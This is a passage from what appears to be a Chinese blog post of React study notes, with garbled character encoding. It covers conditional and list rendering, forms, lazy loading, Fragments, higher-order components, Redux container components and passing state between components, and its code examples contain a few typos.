class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">const</span> isLoggedIn = <span class="keyword">this</span>.state.isLoggedIn;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;isLoggedIn ? (</span><br><span class="line">        &lt;LogoutBtn /&gt;</span><br><span class="line">      ) : (</span><br><span class="line">        &lt;LoginBtn /&gt;</span><br><span class="line">      )&#125;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-åˆ—è¡¨æ¸²æŸ“"><a href="#1-2-åˆ—è¡¨æ¸²æŸ“" class="headerlink" title="1.2 åˆ—è¡¨æ¸²æŸ“"></a>1.2 åˆ—è¡¨æ¸²æŸ“</h4><p><em><code>Array.map</code></em>å®ç°åˆ—è¡¨æ¸²æŸ“ï¼Œkey å¸®åŠ© React è¯†åˆ«å“ªäº›å…ƒç´ æ”¹å˜äº†ï¼Œæ¯”å¦‚è¢«æ·»åŠ æˆ–åˆ é™¤ã€‚æ•°ç»„å…ƒç´ ä¸­ä½¿ç”¨çš„ key åœ¨å…¶å…„å¼ŸèŠ‚ç‚¹ä¹‹é—´åº”è¯¥æ˜¯ç‹¬ä¸€æ— äºŒçš„ã€‚ç„¶è€Œï¼Œå®ƒä»¬ä¸éœ€è¦æ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œå½“æˆ‘ä»¬ç”Ÿæˆä¸¤ä¸ªä¸åŒçš„æ•°ç»„æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ keyã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NumberList</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> items = props.items;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;items.map(item, index) =&gt;</span><br><span class="line">        &lt;li key=&#123;item.id&#125;&gt;&#123;item.text&#125;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/u</span>l&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3-è¡¨å•ç»„ä»¶"><a href="#1-3-è¡¨å•ç»„ä»¶" class="headerlink" title="1.3 è¡¨å•ç»„ä»¶"></a>1.3 è¡¨å•ç»„ä»¶</h4><p>è¡¨å•å…ƒç´ çš„å·¥ä½œæ–¹å¼å’Œå…¶ä»–çš„ DOM å…ƒç´ æœ‰äº›ä¸åŒï¼Œè¡¨å•å…ƒç´ é€šå¸¸ä¼šä¿æŒä¸€äº›å†…éƒ¨çš„ stateã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// è¡¨å•å…ƒç´ çŠ¶æ€ç”±ä½¿ç”¨è€…ç»´æŠ¤ <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">&#123;this.state.value&#125;</span></span></span><br><span class="line"><span class="tag"><span class="attr">onChange</span>=<span class="string">&#123;(e)</span> =&gt;</span> this.setState(&#123; value: e.target.value &#125;)&#125; /&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">value</span>=<span class="string">"&#123;this.state.value&#125;"</span> <span class="attr">onChange</span>=<span class="string">"&#123;this.handleChange&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// è¡¨å•å…ƒç´ çŠ¶æ€DOMè‡ªèº«ç»´æŠ¤ <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">ref</span>=<span class="string">&#123;node</span> =&gt;</span> this.input = node&#125; /&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-props-children"><a href="#1-4-props-children" class="headerlink" title="1.4 props.children"></a>1.4 props.children</h4><p>æœ‰äº›ç»„ä»¶æ— æ³•æå‰çŸ¥é“å®ƒä»¬å­ç»„ä»¶çš„å…·ä½“å†…å®¹ã€‚é€šè¿‡<em><code>props.children</code></em>å¯ä»¥å°†ä»–ä»¬çš„å­ç»„ä»¶æ¸²æŸ“åˆ°ç»“æœä¸­ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FancyBorder</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;</span>'<span class="attr">FancyBorder-</span>' + <span class="attr">props.color</span>&#125;&gt;</span>&#123;props.children&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WelcomeDialog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;FancyBorder color=<span class="string">"blue"</span>&gt;</span><br><span class="line">      &lt;h1&gt;welcome&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;Thank for coming!&lt;/</span>p&gt;</span><br><span class="line">    &lt;<span class="regexp">/FancyBorder&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-5-React-lazy-ä¸-Suspense"><a href="#1-5-React-lazy-ä¸-Suspense" class="headerlink" title="1.5 React.lazy ä¸ Suspense"></a>1.5 React.lazy ä¸ Suspense</h4><p><code>React.lazy</code>èƒ½è®©ä½ åƒæ¸²æŸ“å¸¸è§„ç»„ä»¶ä¸€æ ·å¤„ç†åŠ¨æ€å¼•å…¥ã€‚ä½ å¯ä»¥å°†<code>Suspense</code>ç»„ä»¶ç½®äºæ‡’åŠ è½½ç»„ä»¶ä¹‹ä¸Šçš„ä»»ä½•ä½ç½®ï¼Œ<code>fallback</code>å±æ€§æ¥å—ä»»ä½•åœ¨ç»„ä»¶åŠ è½½è¿‡ç¨‹ä¸­ä½ æƒ³å±•ç¤ºçš„ React å…ƒç´ ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> OtherComponent = React.lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./OtherComponent'</span>));</span><br><span class="line"><span class="keyword">const</span> AnotherComponent = React.lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./AnotherComponent'</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyComponent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Suspense fallback=&#123;&lt;div&gt;Loading...&lt;<span class="regexp">/div&gt;&#125;&gt;</span></span><br><span class="line"><span class="regexp">        &lt;OtherComponent /</span>&gt;</span><br><span class="line">        &lt;AnotherComponent /&gt;</span><br><span class="line">      &lt;<span class="regexp">/Suspense&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…åˆ React Router,åŸºäºè·¯ç”±è¿›è¡Œä»£ç åˆ†å‰²</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; BrowserRouter <span class="keyword">as</span> Router, Route, Switch &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> React, &#123; Suspense, lazy &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./routes/Home'</span>));</span><br><span class="line"><span class="keyword">const</span> About = lazy(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'./routes/About'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> (</span><br><span class="line">  &lt;Route&gt;</span><br><span class="line">    &lt;Suspense fallback=&#123;&lt;div&gt;Loading...&lt;<span class="regexp">/div&gt;&#125;&gt;</span></span><br><span class="line"><span class="regexp">      &lt;Switch&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Route exact path="/</span><span class="string">" component=&#123;Home&#125; /&gt;</span></span><br><span class="line"><span class="string">        &lt;Route path="</span>/about<span class="string">" component=&#123;About&#125; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/Switch&gt;</span></span><br><span class="line"><span class="string">    &lt;/Suspense&gt;</span></span><br><span class="line"><span class="string">  &lt;/Router&gt;</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-6-Fragments"><a href="#1-6-Fragments" class="headerlink" title="1.6 Fragments"></a>1.6 Fragments</h4><p>Reactå¸¸å¸¸æ˜¯ä¸€ä¸ªç»„ä»¶è¿”å›å¤šä¸ªå…ƒç´ ï¼ŒFragmentså…è®¸ä½ å°†å­åˆ—è¡¨åˆ†ç»„ï¼Œè€Œæ— éœ€å‘DOMæ·»åŠ é¢å¤–èŠ‚ç‚¹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;React.Fragment&gt;</span><br><span class="line">      &lt;ChildA /&gt;</span><br><span class="line">      &lt;ChildB /&gt;</span><br><span class="line">    &lt;<span class="regexp">/React.Fragment&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ çŸ­è¯­æ³•ï¼šç©ºæ ‡ç­¾</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">&lt;&gt;</span></span><br><span class="line"><span class="regexp">&lt;td&gt;hello&lt;/</span>td&gt;</span><br><span class="line">&lt;td&gt;world&lt;<span class="regexp">/td&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>&gt;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-7-é«˜é˜¶ç»„ä»¶"><a href="#1-7-é«˜é˜¶ç»„ä»¶" class="headerlink" title="1.7 é«˜é˜¶ç»„ä»¶"></a>1.7 é«˜é˜¶ç»„ä»¶</h4><ul><li>åœ¨æŒ‚è½½æ—¶ï¼Œæƒ³DataSourceæ·»åŠ ä¸€ä¸ªæ›´æ”¹ä¾¦å¬å™¨</li><li>åœ¨ä¾¦å¬å™¨å†…éƒ¨ï¼Œå½“æ•°æ®æºå‘ç”Ÿå˜åŒ–æ—¶ï¼Œè°ƒç”¨setState</li><li>åœ¨å¸è½½æ—¶ï¼Œåˆ é™¤ä¾¦å¬å™¨<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> CommentListWithSubscription = withSubscription(</span><br><span class="line">  CommonList,</span><br><span class="line">  (DataSource) =&gt; DataSource.getComments()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withSubscription</span>(<span class="params">WrappedComponent, selectData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">      <span class="keyword">super</span>(props);</span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        data: selectData(DataSource, props)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">      DataSoure.addChangeListener(<span class="keyword">this</span>.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmout() &#123;</span><br><span class="line">      DataSource.removeChangeListener(<span class="keyword">this</span>.handleChange)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleChange = <span class="function"><span class="params">()</span> =&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        data: selectData(DataSource, <span class="keyword">this</span>.props)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> <span class="attr">data</span>=<span class="string">&#123;this.state.data&#125;</span> &#123;<span class="attr">...this.props</span>&#125;&gt;</span></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">`</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-8-åœ¨ä¸€ä¸ªæ¨¡å—ä¸­å¯¼å‡ºå¤šä¸ªå¤šç»„ä»¶"><a href="#1-8-åœ¨ä¸€ä¸ªæ¨¡å—ä¸­å¯¼å‡ºå¤šä¸ªå¤šç»„ä»¶" class="headerlink" title="1.8 åœ¨ä¸€ä¸ªæ¨¡å—ä¸­å¯¼å‡ºå¤šä¸ªå¤šç»„ä»¶"></a>1.8 åœ¨ä¸€ä¸ªæ¨¡å—ä¸­å¯¼å‡ºå¤šä¸ªå¤šç»„ä»¶</h4><p><br></p><h3 id="2-ç»“åˆredux"><a href="#2-ç»“åˆredux" class="headerlink" title="2. ç»“åˆredux"></a>2. ç»“åˆredux</h3><table><thead><tr><th></th><th style="text-align:center">å±•ç¤ºç»„ä»¶</th><th style="text-align:right">å®¹å™¨ç»„ä»¶</th></tr></thead><tbody><tr><td>å®šä¹‰</td><td style="text-align:center">ä¸å…³å¿ƒæ•°æ®æ¥æºå’Œå¦‚ä½•å˜åŒ–ï¼Œä¼ å…¥ä»€ä¹ˆå°±æ¸²æŸ“ä»€ä¹ˆ</td><td style="text-align:right">ç›‘å¬redux storeå˜åŒ–å¹¶è¿‡æ»¤å‡ºè¦æ˜¾ç¤ºçš„æ•°æ®</td></tr><tr><td>ä½œç”¨</td><td style="text-align:center">æè¿°å¦‚ä½•å±•ç¤ºï¼ˆéª¨æ¶ã€æ ·å¼ï¼‰</td><td style="text-align:right">æè¿°å¦‚ä½•è¿è¡Œï¼ˆæ•°æ®è·å–ã€çŠ¶æ€æ›´æ–°ï¼‰</td></tr><tr><td>ç›´æ¥ä½¿ç”¨Redux</td><td style="text-align:center">å¦</td><td style="text-align:right">æ˜¯</td></tr><tr><td>æ•°æ®æ¥æº</td><td style="text-align:center">props</td><td style="text-align:right">ç›‘å¬Redux state</td></tr><tr><td>æ•°æ®ä¿®æ”¹</td><td style="text-align:center">ä»propsè°ƒç”¨å›è°ƒå‡½æ•°</td><td style="text-align:right">å‘Reduxæ´¾å‘actions</td></tr><tr><td>è°ƒç”¨æ–¹å¼</td><td style="text-align:center">æ‰‹åŠ¨</td><td style="text-align:right">é€šå¸¸ç”±React Reduxç”Ÿæˆ</td></tr></tbody></table><h4 id="2-1-æ— çŠ¶æ€ç»„ä»¶"><a href="#2-1-æ— çŠ¶æ€ç»„ä»¶" class="headerlink" title="2,1 æ— çŠ¶æ€ç»„ä»¶"></a>2,1 æ— çŠ¶æ€ç»„ä»¶</h4><p>ä½¿ç”¨å‡½æ•°å¼æ— çŠ¶æ€ç»„ä»¶ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨æœ¬åœ° state, ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œæ€§èƒ½ä¼˜åŒ–ï¼Œå¯ä»¥å°†å®ƒä»¬è½¬æˆ classã€‚<br>æŠ€æœ¯ä¸Šä½ å¯ä»¥ç›´æ¥ä½¿ç”¨<code>store.subscribe()</code>æ¥ç¼–å†™å®¹å™¨ç»„ä»¶ï¼Œä½†ä¸å»ºè®®è¿™æ ·åšï¼Œåº”ä½¿ç”¨ React Redux çš„<code>connect()</code>æ–¹æ³•ç”Ÿæˆå®¹å™¨ç»„ä»¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Todo = <span class="function">(<span class="params">&#123; onClick, completed, text &#125;</span>) =&gt;</span> (</span><br><span class="line">  &lt;li onClick=&#123;onClick&#125; style=&#123;&#123; <span class="attr">color</span>: completed ? <span class="string">'green'</span> : <span class="string">'red'</span> &#125;&#125;&gt;</span><br><span class="line">    &#123;text&#125;</span><br><span class="line">  &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const TodoList = (&#123; todos, onTodoClick &#125;) =&gt; (</span></span><br><span class="line"><span class="regexp">  &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">    &#123;todos.map((todo, index) =&gt; (</span></span><br><span class="line"><span class="regexp">      &lt;Todo key=&#123;index&#125; &#123;...todo&#125; onClick=&#123;() =&gt; onTodoClick(index)&#125; /</span>&gt;</span><br><span class="line">    ))&#125;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const Link = (&#123; active, children, onClick &#125;) =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  if (active) &#123;</span></span><br><span class="line"><span class="regexp">    return &lt;span&gt;&#123;children&#125;&lt;/</span>span&gt;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;a</span><br><span class="line">      href=<span class="string">""</span></span><br><span class="line">      onClick=&#123;e =&gt; &#123;</span><br><span class="line">        e.preventDefault();</span><br><span class="line">        onClick();</span><br><span class="line">      &#125;&#125;</span><br><span class="line">    &gt;</span><br><span class="line">      &#123;children&#125;</span><br><span class="line">    &lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-2-æœ‰çŠ¶æ€ç»„ä»¶"><a href="#2-2-æœ‰çŠ¶æ€ç»„ä»¶" class="headerlink" title="2.2 æœ‰çŠ¶æ€ç»„ä»¶"></a>2.2 æœ‰çŠ¶æ€ç»„ä»¶</h4><p>æœ‰çŠ¶æ€ç»„ä»¶ï¼Œå°±æ˜¯ä½¿ç”¨<code>store.subscribe()</code>ä»Redux stateæ ‘ä¸­è¯»å–éƒ¨åˆ†æ•°æ®ï¼Œå¹¶é€šè¿‡propsæ¥æŠŠè¿™äº›æ•°æ®æä¾›ç»™è¦æ¸²æŸ“çš„ç»„ä»¶ã€‚ä½†å»ºè®®ä½¿ç”¨React Reduxåº“çš„<code>connect()</code>æ¥ç”Ÿæˆï¼Œè¿™ä¸ªæ–¹æ³•åšäº†é¿å…äº†å¾ˆå¤šä¸å¿…è¦çš„é‡å¤æ¸²æŸ“ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Home</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-å…¨å±€ç»„ä»¶"><a href="#2-3-å…¨å±€ç»„ä»¶" class="headerlink" title="2.3 å…¨å±€ç»„ä»¶"></a>2.3 å…¨å±€ç»„ä»¶</h4><p>é€šè¿‡<code>Message.error(&#39;é”™è¯¯&#39;)</code>æ¥æ˜¾ç¤ºç»„ä»¶ã€‚</p><p><br></p><h3 id="3-ç»„ä»¶ä¼ å€¼"><a href="#3-ç»„ä»¶ä¼ å€¼" class="headerlink" title="3. ç»„ä»¶ä¼ å€¼"></a>3. ç»„ä»¶ä¼ å€¼</h3><h4 id="3-1-å…±åŒçˆ¶ç»„ä»¶"><a href="#3-1-å…±åŒçˆ¶ç»„ä»¶" class="headerlink" title="3.1 å…±åŒçˆ¶ç»„ä»¶"></a>3.1 å…±åŒçˆ¶ç»„ä»¶</h4><p>çŠ¶æ€æå‡ï¼Œå°†å¤šä¸ªç»„ä»¶ä¸­éœ€è¦å…±äº«çš„stateå‘ä¸Šç§»åŠ¨åˆ°ä»–ä»¬çš„æœ€è¿‘å…±åŒçˆ¶ç»„ä»¶ä¸­ï¼Œä¾¿å¯å®ç°å…±äº«state</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    scale : <span class="string">''</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange(val) =&gt; &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">scale</span>: val&#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; scale &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ChildOne scale=&#123;scale&#125; onScaleChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">      &lt;ChildTwo scale=&#123;scale&#125; onScaleChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢æŠ€å·§ï¼Œå¯ä»¥å‡å°‘ props çš„ä¼ é€’</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Page</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; user &#125; = props;</span><br><span class="line">  <span class="keyword">const</span> userLink = (</span><br><span class="line">    &lt;Link href=&#123;user.permalink&#125;&gt;</span><br><span class="line">      &lt;Avatar user=&#123;user&#125; size=&#123;props.avatarSize&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">  return &lt;PageLayout userLink=&#123;useLink&#125; /</span>&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-Context-å…¬ç”¨å±æ€§"><a href="#3-2-Context-å…¬ç”¨å±æ€§" class="headerlink" title="3.2 Context å…¬ç”¨å±æ€§"></a>3.2 Context å…¬ç”¨å±æ€§</h4><p>Reactä¸­æ•°æ®æ˜¯é€šè¿‡propså±æ€§è‡ªä¸Šè€Œä¸‹(ç”±çˆ¶åŠå­)è¿›è¡Œä¼ é€’çš„ï¼Œä½†è¿™ç§åšæ³•å¯¹äºæŸäº›ç±»å‹çš„å±æ€§è€Œè¨€æ˜¯æå…¶ç¹ççš„ï¼ˆå¦‚ï¼šåœ°åŒºåå¥½ï¼ŒUIä¸»é¢˜ï¼‰ï¼Œè¿™äº›å±æ€§æ˜¯åº”ç”¨ç¨‹åºä¸­è®¸å¤šç»„ä»¶éƒ½éœ€è¦çš„ã€‚Contextæä¾›äº†ä¸€ç§åœ¨ç»„ä»¶ä¹‹é—´å…±äº«æ­¤å€¼çš„æ–¹å¼ï¼Œè€Œä¸å¿…æ˜¾ç¤ºåœ°é€šè¿‡ç»„ä»¶æ ‘çš„é€å±‚ä¼ é€’propsã€‚</p><p><br></p><h4 id="3-3-Refs"><a href="#3-3-Refs" class="headerlink" title="3.3 Refs"></a>3.3 Refs</h4><p>å°†DOM Refsæš´éœ²ç»™çˆ¶ç»„ä»¶ã€‚ä½ 